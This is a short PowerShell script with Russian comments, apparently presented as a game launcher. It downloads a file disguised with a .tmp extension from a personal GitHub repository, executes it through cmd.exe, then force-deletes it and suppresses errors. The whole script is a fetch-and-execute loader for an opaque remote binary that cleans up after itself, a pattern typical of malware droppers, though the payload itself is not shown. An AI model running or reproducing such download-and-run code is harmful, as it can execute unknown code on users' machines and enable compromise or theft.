$ErrorActionPreference = "Stop"

# --- 1. Скачивание файла во временную папку ---
$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/globalgamemanage.tmp"
$TempFile = Join-Path ([IO.Path]::GetTempPath()) "globalgamemanage.tmp"

Invoke-WebRequest -Uri $GameUrl -OutFile $TempFile -UseBasicParsing

# --- 2. Запуск через cmd.exe ---
# /c — выполнить команду и закрыть cmd
# /wait — ждать завершения программы (аналог WaitForExit)
# Кавычки вокруг пути обязательны, если в пути есть пробелы
$proc = Start-Process -FilePath "cmd.exe" `
    -ArgumentList "/c", "`"$TempFile`"" `
    -PassThru -Wait

# --- 3. Удаление файла после закрытия игры ---
Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
